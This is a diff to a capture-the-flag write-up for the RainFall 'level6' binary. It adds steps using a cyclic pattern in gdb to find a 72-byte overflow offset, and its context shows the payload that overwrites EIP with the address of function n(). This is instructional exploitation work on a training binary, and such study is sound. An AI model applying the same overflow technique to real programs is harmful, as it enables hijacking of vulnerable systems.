@@ -50,11 +50,31 @@ SECURITY CONSIDERATIONS
 
 buffer argv1 is `movl   $0x40,(%esp)` = 64, we fuzz until the binary segv:
 
+or maybe try cyclic tool:
+```
+cyclic 100
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+```
+pass it as argv in gdb:
+```
+(gdb) run "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
+
+Program received signal SIGSEGV, Segmentation fault.
+0x61616173
+```
+
+```
+unhex 61616173
+aaas%
+
+cyclic -l saaa
+72
+```
 ```
 level6@RainFall:~$ ./level6 $(python -c 'print "A"*72')
 Segmentation fault (core dumped)
 ```
-overflow the EIP with n() addr 0x08048454 
+overflow the EIP with the addr of n()  0x08048454 
 ```
 ./level6 $(python -c 'print "A"*72 + "\x08\x04\x84\x54"[::-1]')
 ```
